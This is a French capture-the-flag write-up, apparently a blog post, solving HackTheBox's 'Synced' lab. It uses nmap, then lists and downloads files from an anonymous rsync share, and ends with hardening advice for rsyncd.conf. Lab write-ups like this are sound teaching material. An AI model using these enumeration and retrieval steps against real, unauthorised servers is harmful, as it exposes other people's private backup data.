---
title: "Synced"
date: 2026-01-16
description: "Découverte d'un service de backup."
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, linux, vip, tier-0]
slug: synced
---

# Introduction

**Synced** est la dernière étape du **Tier 0** de **Starting Point**. On termine en beauté avec un utilitaire de transfert de fichiers extrêmement courant sous Linux : **rsync**.

:::tip
Attention : Il s'agit d'une machine VIP. Vous aurez besoin d'un abonnement HTB pour pouvoir la lancer.
:::

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation. Respectez les règles de la plateforme.
:::

Cette machine illustre parfaitement comment un outil de sauvegarde, s'il est mal configuré, peut devenir une porte ouverte sur vos données.

[▶ RavenBreach sur YouTube](https://www.youtube.com/@Raven_Breach/videos)

---

## Reconnaissance

### Découverte d'hôte

```bash
┌─[ravenbreach@htb]─[~]
└──╼ $ ping 10.129.8.119

64 bytes from 10.129.8.119: icmp_seq=1 ttl=63 time=8.33 ms
```

### Énumération des services

```bash
┌─[ravenbreach@htb]─[~]
└──╼ $ nmap -sV 10.129.8.119

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

Port **873** ouvert. Le service est `rsync` — un outil de synchronisation et transfert de fichiers massivement utilisé pour les backups de serveurs. Il ne transfère que les parties modifiées des fichiers (système de "delta").

---

## Pré-Exploitation

### Evaluation de vulnérabilité

Parfois, **rsync** est configuré pour accepter des connexions anonymes. On liste les répertoires disponibles.

```bash
┌─[ravenbreach@htb]─[~]
└──╼ $ rsync --list-only 10.129.8.119::

public          Anonymous Share
```

Un partage **public** en accès anonyme !

---

## Exploitation

### Exploration du dossier

```bash
┌─[ravenbreach@htb]─[~]
└──╼ $ rsync --list-only 10.129.8.119::public

-rw-r--r--  33  2022/10/24  flag.txt
```

### Récupération du flag

```bash
┌─[ravenbreach@htb]─[~]
└──╼ $ rsync 10.129.8.119::public/flag.txt flag.txt

┌─[ravenbreach@htb]─[~]
└──╼ $ cat flag.txt

72e{...}519
```

La machine est **pwned** !

---

## Post-Exploitation

La faille résidait dans `/etc/rsyncd.conf`. En autorisant l'accès sans authentification à un module, l'administrateur a transformé son outil de sauvegarde en serveur de fichiers public.

**Leçon** : ne jamais exposer rsync sans authentification (`auth users`) et restreindre l'accès par IP pour que seuls les serveurs de backup autorisés puissent se connecter.
